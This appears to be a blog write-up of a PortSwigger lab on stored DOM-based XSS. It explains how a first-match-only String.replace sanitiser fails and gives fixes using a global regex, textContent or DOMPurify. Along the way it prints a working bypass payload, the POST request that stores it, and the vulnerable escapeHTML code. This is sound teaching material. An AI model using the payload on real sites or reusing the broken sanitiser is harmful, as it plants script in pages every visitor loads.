---
layout: post
title: "PortSwigger: Stored DOM XSS"
date: 2026-09-01 09:00:00 -0500
categories: [PortSwigger, XSS]
tags: [xss, dom-xss, stored-xss, javascript, innerHTML, CWE-79]
---

## Overview

This lab demonstrates a **stored DOM-based XSS** vulnerability where a custom
JavaScript sanitiser uses `String.replace()` with a plain string argument —
replacing only the **first** occurrence of each angle bracket — before writing
comment bodies into the DOM via `innerHTML`.

**CWE:** [CWE-79 — Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

---

## The Vulnerability

When a visitor views a blog post, the app loads and executes this script:

```js
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
// later...
commentBodyPElement.innerHTML = escapeHTML(comment.body);
```

The critical flaw is `html.replace('<', '&lt;')` — passing a **string literal**
as the first argument to `replace()`. According to the ECMAScript specification,
`String.prototype.replace(searchValue, replaceValue)` when `searchValue` is a
string (not a `RegExp`) replaces **only the first match** in the string.

This means only the very first `<` and the very first `>` get encoded. Any
subsequent angle brackets pass through raw and reach the `innerHTML` sink
as executable HTML.

---

## The Exploit

The bypass is simple: prepend a **dummy `<>` pair** at the start of the payload.
The filter burns both of its replacements on the empty brackets, leaving the
real XSS tag untouched.

**Payload stored in the comment field:**
```
<><img src=1 onerror=alert(1)>
```

**After `escapeHTML()` runs:**
```
&lt;&gt;<img src=1 onerror=alert(1)>
```

The `&lt;&gt;` renders as harmless text `<>`. The `<img src=1 onerror=alert(1)>` 
is a real HTML element — `src=1` fails to load, triggering `onerror`, which calls `alert(1)`.

**Storing the payload (CSRF-protected form):**
```
POST /post/comment
Cookie: session=<session>
Content-Type: application/x-www-form-urlencoded

csrf=<token>&postId=2&comment=<><img src=1 onerror=alert(1)>&name=attacker&email=attacker@test.com
```

A `302` redirect confirms the comment was accepted. After that, every visitor
who loads the post page triggers the XSS — no per-victim link, no exploit server,
no interaction required beyond viewing the page.

---

## Why This Is Stored (and More Dangerous Than Reflected)

Stored XSS is planted once and replays to every future visitor automatically.
Privileged users like admins naturally browse user-generated content — a stored
payload is more likely to reach a high-value target than a reflected payload
that requires social engineering. Here the comment sits in the database
indefinitely until deleted.

---

## The Fix

Use a **regex with the `/g` flag** so every occurrence is replaced, or avoid
`innerHTML` altogether:

```js
// Broken: only first occurrence encoded
html.replace('<', '&lt;').replace('>', '&gt;');

// Fixed: /g replaces ALL occurrences
html.replace(/</g, '&lt;').replace(/>/g, '&gt;');

// Better: use textContent (no HTML parsing)
commentBodyPElement.textContent = comment.body;

// Best: use DOMPurify
commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);
```

The root cause is treating `innerHTML` as a safe sink when only partial
sanitisation is applied. The correct pattern is `textContent` for plain text,
or a battle-tested sanitiser (DOMPurify) when HTML rendering is genuinely
needed.
